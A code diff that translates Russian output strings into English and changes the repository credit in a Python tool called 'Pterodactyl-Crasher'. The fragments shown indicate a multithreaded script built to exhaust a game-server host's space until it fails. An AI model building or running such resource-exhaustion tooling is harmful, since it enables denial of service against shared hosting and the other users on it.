@@ -18,7 +18,7 @@ def allocate_space():
             curr += 1
             megabytes += 1
         except subprocess.CalledProcessError as e:
-            print("Нету места на хосте, ")
+            print("There is no room for a host!, ")
             break
         except Exception as e:
             pass
@@ -31,7 +31,7 @@ def display_status():
         while True:
             sleep(0.1)
             displays += 1
-            print(f"Закачал всего [ {megabytes} ГБ ] со скоростью [ {curr} Гб/с ]")
+            print(f"Uploaded a total of [ {megabytes} GB ] at a speed of [ {curr} GB/s ]")
             if displays % 10 == 0:
                 curr = 0
     except Exception as e:
@@ -39,9 +39,9 @@ def display_status():
 
 
 def main():
-    print("github.com/xdearboy/Pterodactyl-Crasher \n\nPterodactyl-Crasher")
-    print("Режим: забивка всей памяти")
-    print("Подготовка..")
+    print("github.com/ManucrackYT/Pterodactyl-Crasher \n\nPterodactyl-Crasher")
+    print("Mode: full memory")
+    print("Getting ready..")
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=48) as executor:
         for _ in range(48):
